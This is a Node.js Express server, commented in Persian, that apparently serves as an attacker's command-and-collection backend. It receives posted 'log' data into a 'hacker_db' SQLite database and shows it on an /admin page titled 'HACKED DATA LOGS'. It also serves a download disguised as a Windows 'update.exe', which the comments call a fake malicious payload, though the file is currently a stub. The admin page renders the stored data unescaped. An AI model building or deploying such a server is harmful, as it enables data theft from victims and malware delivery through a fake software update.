const express = require('express');
const sqlite3 = require('sqlite3').verbose();
const path = require('path');
const fs = require('fs');
const app = express();
const PORT = process.env.PORT || 3000;

// تنظیمات دیتابیس
const DB_FILE = 'hacker_db.sqlite';
const db = new sqlite3.Database(DB_FILE);

// ساخت جدول
db.serialize(() => {
    db.run("CREATE TABLE IF NOT EXISTS logs (id INTEGER PRIMARY KEY AUTOINCREMENT, data TEXT, timestamp DATETIME DEFAULT CURRENT_TIMESTAMP)");
});

app.use(express.text()); // برای دریافت متن لاگ
app.use(express.json()); // برای JSON

// 1. صفحه اصلی (مخفی)
app.get('/', (req, res) => {
    res.sendFile(__dirname + '/index.html');
});

// 2. دریافت داده (Log)
app.post('/log', (req, res) => {
    const data = req.body;
    db.run("INSERT INTO logs (data) VALUES (?)", [data], function(err) {
        if (err) console.error(err);
        res.send('OK');
    });
});

// 3. پنل ادمین (Admin Panel)
app.get('/admin', (req, res) => {
    db.all("SELECT * FROM logs ORDER BY id DESC", [], (err, rows) => {
        if (err) return res.send("Database Error");
        
        let html = `<html><body style="background:#000; color:#0f0; font-family:monospace; padding:20px;">
                    <h1>HACKED DATA LOGS</h1>
                    <table border="1" cellpadding="10" style="border-collapse: collapse; width:100%;">
                    <tr><th>ID</th><th>Data</th><th>Time</th></tr>`;
                    
        if (rows.length === 0) {
            html += "<tr><td colspan='3'>No data yet.</td></tr>";
        } else {
            rows.forEach(row => {
                html += `<tr><td>${row.id}</td><td>${row.data.replace(/\n/g, '<br>')}</td><td>${row.timestamp}</td></tr>`;
            });
        }
        html += "</table></body></html>";
        res.send(html);
    });
});

// 4. سرو کردن فایل‌های مخرب (Fake Payloads)
// فرض بر این است که فایل‌های زیر را در پوشه پروژه داشته باشی
app.get('/download/exe', (req, res) => {
    // اگر فایل وجود ندارد، یک فایل متنی ساده می‌سازد تا تست شود
    const fakeExe = "FAKE_WINDOWS_UPDATE"; 
    res.setHeader('Content-Type', 'application/octet-stream');
    res.setHeader('Content-Disposition', 'attachment; filename="update.exe"');
    res.send(fakeExe);
});

app.listen(PORT, () => {
    console.log(`Server running on port ${PORT}`);
});
